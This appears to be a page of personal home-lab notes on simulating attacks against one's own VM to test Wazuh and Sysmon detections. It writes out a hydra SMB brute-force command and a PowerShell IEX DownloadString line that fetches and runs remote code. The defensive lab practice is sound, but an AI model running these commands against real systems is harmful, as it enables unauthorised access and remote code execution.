# 04 - attack simulation

now the fun part - do something that looks like an attack and see if wazuh catches it.

**only in the lab, only my own victim vm.** attacking stuff you dont own is illegal, dont.

start with easy loud stuff first so you can confirm the whole thing works (attack -> log -> alert).

## sim 1 - failed logins (brute force)

classic first test. lots of failed logins = easy to make, easy to catch.

from kali using hydra against the victim:

```bash
hydra -l testuser -P /usr/share/wordlists/rockyou.txt 192.168.56.20 smb
```

windows logs a bunch of event 4625 (failed logon) and wazuh alerts on it.

write up: [detections/failed-logins.md](../detections/failed-logins.md)

this one worked first try which felt great ngl.

## sim 2 - suspicious powershell

attackers love powershell. simple test:

```powershell
powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.30/test.txt')"
```

sysmon event 1 grabs the whole command line. stuff like DownloadString / IEX / -enc is suspicious.

write up: [detections/suspicious-powershell.md](../detections/suspicious-powershell.md)

my custom rule for this is being weird - sometimes it fires sometimes it doesnt. still debugging. the built in stuff catches part of it though.

## the loop

for every attack:
1. run it
2. find it in the logs
3. understand why it looks suspicious
4. write a rule to catch it

## next ideas

- atomic red team (small documented tests): https://github.com/redcanaryco/atomic-red-team
- nmap scan from kali
- making a new user (persistence)
